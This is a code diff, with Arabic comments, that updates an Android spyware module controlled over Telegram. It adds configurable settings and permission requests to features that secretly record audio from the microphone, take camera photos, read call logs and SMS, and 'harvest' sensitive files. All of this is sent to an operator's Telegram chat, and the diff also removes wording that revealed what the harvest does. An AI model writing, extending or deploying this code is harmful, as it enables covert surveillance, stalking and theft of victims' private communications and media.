@@ -7,6 +7,7 @@ import logging
 import sys
 import gc
 import importlib
+import hashlib
 from datetime import datetime
 
 # ========== إعداد المسارات ==========
@@ -22,6 +23,9 @@ def _get_runtime_path():
 P = _get_runtime_path()
 PENDING_DIR = os.path.join(P, "pending_upload")
 TEMP_DIR = os.path.join(P, "ctmp")
+CONFIG_FILE = os.path.join(P, "commands_config.json")
+
+# إنشاء المجلدات الضرورية
 for d in [PENDING_DIR, TEMP_DIR]:
     if not os.path.exists(d):
         os.makedirs(d)
@@ -30,7 +34,13 @@ for d in [PENDING_DIR, TEMP_DIR]:
 if P not in sys.path:
     sys.path.insert(0, P)
 
-logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')
+# إعداد التسجيل
+logging.basicConfig(
+    filename=os.path.join(P, "c.log"),
+    level=logging.ERROR,
+    filemode='a',
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
 try:
     from jnius import autoclass, PythonJavaClass, java_method
@@ -48,16 +58,69 @@ except ImportError:
 class C:
     def __init__(self):
         self.mic_busy = False
-        self._mic_lock = threading.Lock()      # قفل لحماية حالة الميكروفون
-        self._component_lock = threading.Lock() # قفل لتحميل المكونات
-        self._components_loaded = False        # علامة لتجنب إعادة التحميل المتكرر
+        self._mic_lock = threading.Lock()
+        self._component_lock = threading.Lock()
+        self._components_loaded = False
+        self._config = self._load_config()
         self._cleanup()
+
+    # ========== إدارة الإعدادات ==========
+    def _load_config(self):
+        """تحميل الإعدادات من ملف"""
+        default_config = {
+            "temp_file_age": 3600,
+            "pending_file_age": 86400,
+            "audio_duration": 10,
+            "min_audio_size": 5000,   # 5KB كحد أدنى (تم رفعه من 100)
+            "min_battery": 15,
+            "enable_logging": True,
+            "max_sms_count": 100,
+            "max_call_count": 100
+        }
+        if os.path.exists(CONFIG_FILE):
+            try:
+                with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
+                    loaded = json.load(f)
+                    default_config.update(loaded)
+            except Exception as e:
+                logging.error(f"Config load error: {e}")
+        return default_config
+
+    def _save_config(self):
+        """حفظ الإعدادات إلى ملف"""
+        try:
+            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
+                json.dump(self._config, f, indent=2, ensure_ascii=False)
+            return True
+        except Exception as e:
+            logging.error(f"Config save error: {e}")
+            return False
+
+    # ========== حذف آمن ==========
+    def _safe_remove(self, path):
+        """حذف ملف مع معالجة الأخطاء"""
+        try:
+            if os.path.exists(path):
+                os.remove(path)
+                return True
+        except Exception as e:
+            logging.error(f"Safe remove error {path}: {e}")
+        return False
+
+    # ========== إنشاء اسم فريد ==========
+    def _unique_filename(self, prefix="file", ext=".txt"):
+        """إنشاء اسم فريد للملف باستخدام الوقت والهاش"""
+        timestamp = int(time.time())
+        hash_str = hashlib.md5(f"{timestamp}{os.getpid()}".encode()).hexdigest()[:8]
+        return f"{prefix}_{timestamp}_{hash_str}{ext}"
 
     # ========== تنظيف الملفات القديمة ==========
     def _cleanup(self):
         try:
             now = time.time()
-            for folder, max_age in [(TEMP_DIR, 3600), (PENDING_DIR, 86400)]:
+            temp_age = self._config.get("temp_file_age", 3600)
+            pending_age = self._config.get("pending_file_age", 86400)
+            for folder, max_age in [(TEMP_DIR, temp_age), (PENDING_DIR, pending_age)]:
                 if not os.path.exists(folder):
                     continue
                 for f in os.listdir(folder):
@@ -67,8 +130,8 @@ class C:
                             os.remove(path)
                     except:
                         pass
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"Cleanup error: {e}")
 
     # ========== التحقق من الصلاحيات ==========
     def _check_permissions(self, permissions):
@@ -78,26 +141,38 @@ class C:
         try:
             from android.permissions import check_permission
             return all(check_permission(p) for p in permissions)
-        except:
+        except Exception as e:
+            logging.error(f"Permission check error: {e}")
             return True
+
+    # ========== طلب الصلاحيات ==========
+    def _request_permissions(self, permissions):
+        """طلب الصلاحيات المطلوبة"""
+        if not JNI:
+            return True
+        try:
+            from android.permissions import request_permissions
+            request_permissions(permissions)
+            return True
+        except Exception as e:
+            logging.error(f"Permission request error: {e}")
+            return False
 
     # ========== تحميل المكونات (محسّن) ==========
     def _ensure_components(self, m):
         """تحميل المكونات المطلوبة (AI، سكانر، معرض، كاميرا، حصاد)"""
         if self._components_loaded:
             return
-            
+
         with self._component_lock:
             if self._components_loaded:
                 return
-                
+
             try:
-                # التحقق من وجود السمات الأساسية
                 if not hasattr(m, 'ui') or m.ui is None:
                     logging.error("UI component not available")
                     return
 
-                # تعريف المكونات المطلوبة
                 components = [
                     ('nude_detector', 'nude_detector', 'NudeDetector',
                      lambda: {'mon': m}),
@@ -117,28 +192,27 @@ class C:
                             module = __import__(module_name)
                             cls = getattr(module, class_name)
                             args = args_fn()
-                            
-                            # استدعاء مختلف حسب نوع المكون
+
                             if attr == 'nude_detector':
                                 setattr(m, attr, cls(args['mon']))
                             else:
                                 setattr(m, attr, cls(**args))
-                                
+
                             logging.info(f"✅ {class_name} loaded")
-                            
+
                         except ImportError as e:
                             logging.error(f"Import error for {module_name}: {e}")
                         except Exception as e:
                             logging.error(f"Init error for {class_name}: {e}")
 
                 self._components_loaded = True
-                
+
             except Exception as e:
                 logging.error(f"Component init error: {e}")
 
     # ========== إرسال ملف نصي ==========
     def _send_text_file(self, tg, chat_id, content, filename):
-        temp_path = os.path.join(PENDING_DIR, f"{int(time.time())}_{filename}")
+        temp_path = os.path.join(PENDING_DIR, self._unique_filename(filename, ".txt"))
         try:
             if not content or not content.strip():
                 tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: لا يوجد محتوى"})
@@ -148,7 +222,7 @@ class C:
                 f.write(content)
 
             if os.path.getsize(temp_path) == 0:
-                os.remove(temp_path)
+                self._safe_remove(temp_path)
                 tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: ملف فارغ"})
                 return
 
@@ -157,36 +231,41 @@ class C:
                                {"chat_id": chat_id, "caption": f"📄 {filename}"},
                                {"document": f})
             if resp and resp.get('ok'):
-                os.remove(temp_path)
+                self._safe_remove(temp_path)
             else:
                 logging.warning(f"File {filename} left in pending")
 
         except Exception as e:
             logging.error(f"_send_text_file error: {e}")
-            # محاولة إرسال كنص إذا فشل إرسال الملف
             try:
                 tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}:\n{content[:4000]}"})
             except:
                 pass
             finally:
-                if os.path.exists(temp_path):
-                    try:
-                        os.remove(temp_path)
-                    except:
-                        pass
+                self._safe_remove(temp_path)
 
-    # ========== تسجيل صوتي ==========
-    def _record_audio(self, duration=10):
+    # ========== تسجيل صوتي (محسّن: رفع الحد الأدنى إلى 5KB) ==========
+    def _record_audio(self, duration=None):
+        """
+        تسجيل صوتي من الميكروفون.
+        - duration: مدة التسجيل بالثواني (افتراضي من الإعدادات)
+        - يتحقق من أن حجم الملف لا يقل عن 5KB (5000 بايت)
+        """
         if not JNI:
+            logging.error("JNI not available")
             return None
+
+        duration = duration or self._config.get("audio_duration", 10)
+        min_size = self._config.get("min_audio_size", 5000)  # 5KB
 
         with self._mic_lock:
             if self.mic_busy:
+                logging.warning("Microphone is busy")
                 return None
             self.mic_busy = True
 
         media_recorder = None
-        out_path = os.path.join(TEMP_DIR, f"audio_{int(time.time())}.aac")
+        out_path = os.path.join(TEMP_DIR, self._unique_filename("audio", ".aac"))
 
         try:
             # التحقق من صلاحية التسجيل
@@ -204,19 +283,34 @@ class C:
             media_recorder.prepare()
             media_recorder.start()
 
-            # تسجيل لمدة محددة مع إمكانية المقاطعة
+            logging.info(f"Recording audio for {duration} seconds...")
+
+            # تسجيل لمدة محددة
             for _ in range(duration):
+                if hasattr(self, '_stop_recording') and self._stop_recording:
+                    break
                 time.sleep(1)
 
             media_recorder.stop()
             media_recorder.reset()
 
-            if os.path.exists(out_path) and os.path.getsize(out_path) > 100:
-                return out_path
-            return None
+            # التحقق من الملف
+            if os.path.exists(out_path):
+                size = os.path.getsize(out_path)
+                if size >= min_size:
+                    logging.info(f"Audio recorded successfully: {size} bytes")
+                    return out_path
+                else:
+                    logging.warning(f"Audio file too small: {size} bytes (min {min_size})")
+                    self._safe_remove(out_path)
+                    return None
+            else:
+                logging.error("Audio file not created")
+                return None
 
         except Exception as e:
             logging.error(f"Recording error: {e}")
+            self._safe_remove(out_path)
             return None
         finally:
             if media_recorder:
@@ -228,9 +322,11 @@ class C:
                 self.mic_busy = False
 
     # ========== جلب سجل المكالمات ==========
-    def _call_log(self, limit=100):
+    def _call_log(self, limit=None):
         if not JNI:
             return "JNI غير متاح"
+
+        limit = limit or self._config.get("max_call_count", 100)
 
         if not self._check_permissions(['android.permission.READ_CALL_LOG']):
             return "⚠️ لا توجد صلاحية لقراءة سجل المكالمات"
@@ -281,9 +377,11 @@ class C:
                     pass
 
     # ========== جلب رسائل SMS ==========
-    def _sms_log(self, limit=100):
+    def _sms_log(self, limit=None):
         if not JNI:
             return "JNI غير متاح"
+
+        limit = limit or self._config.get("max_sms_count", 100)
 
         if not self._check_permissions(['android.permission.READ_SMS']):
             return "⚠️ لا توجد صلاحية لقراءة الرسائل"
@@ -335,7 +433,8 @@ class C:
         try:
             if hasattr(m, '_battery_ok') and callable(m._battery_ok):
                 b, ch = m._battery_ok()
-                return b >= 15 or ch
+                min_battery = self._config.get("min_battery", 15)
+                return b >= min_battery or ch
         except Exception as e:
             logging.error(f"Battery check error: {e}")
         return True
@@ -350,17 +449,14 @@ class C:
             if not cmd or not isinstance(cmd, str):
                 return
 
-            # تأكيد استلام callback
             if cbq:
                 try:
                     tg._api("answerCallbackQuery", {"callback_query_id": cbq})
                 except:
                     pass
 
-            # تحميل المكونات
             self._ensure_components(m)
 
-            # توزيع الأوامر على معالجات منفصلة
             if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|", "g_bulk|")):
                 self._handle_gallery(cmd, tg, m, cid)
             elif cmd.startswith(("cam_", "camf_")):
@@ -439,7 +535,7 @@ class C:
             is_front = 1 if "camf_" in cmd else 0
 
             if not self._battery_ok(m):
-                tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً (أقل من 15%)"})
+                tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً"})
                 return
 
             if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
@@ -455,7 +551,7 @@ class C:
                     logging.error(f"Camera harvest error: {e}")
 
             threading.Thread(target=capture_and_analyze, daemon=True).start()
-            tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها. سيتم إرسال النتائج لاحقاً."})
+            tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها."})
 
         except Exception as e:
             logging.error(f"Camera handler error: {e}")
@@ -465,13 +561,14 @@ class C:
     def _handle_mic(self, tg, m, cid):
         try:
             if self.mic_busy:
-                tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ حالياً"})
+                tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
                 return
 
-            tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})
+            duration = self._config.get("audio_duration", 10)
+            tg._api("sendMessage", {"chat_id": cid, "text": f"🎤 جاري التسجيل لمدة {duration} ثوانٍ..."})
 
             def record_and_send():
-                audio_path = self._record_audio(10)
+                audio_path = self._record_audio(duration)
                 if audio_path and os.path.exists(audio_path):
                     try:
                         target = getattr(m, 'vlt', cid)
@@ -480,13 +577,10 @@ class C:
                     except Exception as e:
                         logging.error(f"Send voice error: {e}")
                     finally:
-                        try:
-                            os.remove(audio_path)
-                        except:
-                            pass
+                        self._safe_remove(audio_path)
                 else:
                     try:
-                        tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
+                        tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل (الملف صغير جداً أو تالف)"})
                     except:
                         pass
 
@@ -520,7 +614,7 @@ class C:
     def _handle_harvest(self, tg, m, cid):
         try:
             if hasattr(m, 'daily_zipper') and m.daily_zipper:
-                tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد (جمع الملفات الحساسة وإرسالها)... قد يستغرق دقائق"})
+                tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد... قد يستغرق دقائق"})
 
                 def run_harvest():
                     try:
@@ -560,7 +654,7 @@ class C:
             if hasattr(m, 'gallery_browser') and m.gallery_browser:
                 kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                 res = tg._api("sendMessage",
-                             {"chat_id": cid, "text": "🖼️ معرض الوسائط (غير المصنفة بعد)",
+                             {"chat_id": cid, "text": "🖼️ معرض الوسائط",
                               "reply_markup": json.dumps(kb)})
                 if res and res.get('ok'):
                     m.last_mid = res['result']['message_id']
@@ -573,7 +667,7 @@ class C:
 
 # ========== دالة الإرسال الفوري الخارجية ==========
 def force_send_zip(m, device_id, tg, chat_id):
-    """إرسال الملف المضغوط فوراً (يتم استدعاؤها من زر send_now)"""
+    """إرسال الملف المضغوط فوراً"""
     try:
         if hasattr(m, 'daily_zipper') and m.daily_zipper:
             threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,), daemon=True).start()
